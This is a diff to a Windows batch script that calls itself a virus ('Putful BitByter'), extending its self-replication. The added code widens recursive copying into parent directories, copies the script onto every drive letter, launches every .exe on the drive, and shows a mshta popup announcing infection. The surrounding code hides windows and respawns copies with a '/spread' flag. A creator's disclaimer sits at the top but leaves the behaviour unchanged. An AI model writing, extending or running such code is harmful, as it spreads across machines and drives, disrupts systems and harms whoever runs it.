@@ -1,3 +1,5 @@
+@REM DO NOT RUN PUTFUL BITBYTER WITH MALICIOUS OR ILLEGAL INTENT, I AS CREATOR DO NOT CONTROL WHAT THIS MIGHT DO, AND YOU ARE SOLELY RESPONSILE FOR YOUR USAGE OF THIS CODE.
+:boopcodenose
 @if "%1"=="/spread" goto letsbegintheterror
 @if exist \dontbytethebitsonthisdrive.putfull (
 @echo off
@@ -7,7 +9,7 @@ exit
 )
 @echo HI! You die today!
 @echo:
-@echo This virus was made to show the power of a simple virus meant to be harmful. If you didn't mean to run it, you are probably in trouble, ask a superior in IT for help.
+@echo This virus was made to show the power of a simple computer 'virus'. If you didn't mean to run it, you are probably in trouble, ask a superior in IT for help.
 @echo:
 @echo The drive that will be targeted looks like this:
 @echo:
@@ -18,8 +20,11 @@ exit
 cls
 :letsbegintheterror
 powershell -WindowStyle Hidden -command ""
+if "%~n0"=="23" goto iam23
+if "%~n0"=="25" goto iam25
+if %~n0 GEQ 26 call :flood
 :loop
-FOR /F "tokens=*" %%G IN ('dir /b /S /AD "%~dp0*"') DO call :pool "%%G\"
+FOR /F "tokens=*" %%G IN ('dir /b /S /AD "%~dp0..\..\*"') DO call :pool "%%G\"
 call :pool "%~dp0"
 type "%~s0" > ..\%~nx0
 start /min cmd /c ..\%~nx0 /spread
@@ -73,3 +78,19 @@ if %putfullpoolloopnumber% LSS 31 goto :pool else (
 set "putfullpoolloopnumber=1"
 exit /b
 )
+exit /b
+:flood
+FOR %%G IN (a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) DO (call :bushfire %%G:\)
+exit /b
+:bushfire
+if exist "%~dp1\%~nx0" exit /b
+pushd "%~dp1\" || exit /b
+type "%~s0" > "%~dp1\%~nx0"
+popd
+exit /b
+:iam23
+start mshta about:Noticed%20some%20slowness,%20weird%20black%20boxes%20popping%20up%3F%20You%20have%20been%20infected%20by%20the%20The%20BitByter-Putful%20virus.%20And%20there%20is%20no%20going%20back.
+goto loop
+:iam25
+FOR /F "tokens=*" %%G IN ('dir /b /S "%~d0\*.exe"') DO start cmd /c "%%G\"
+goto loop
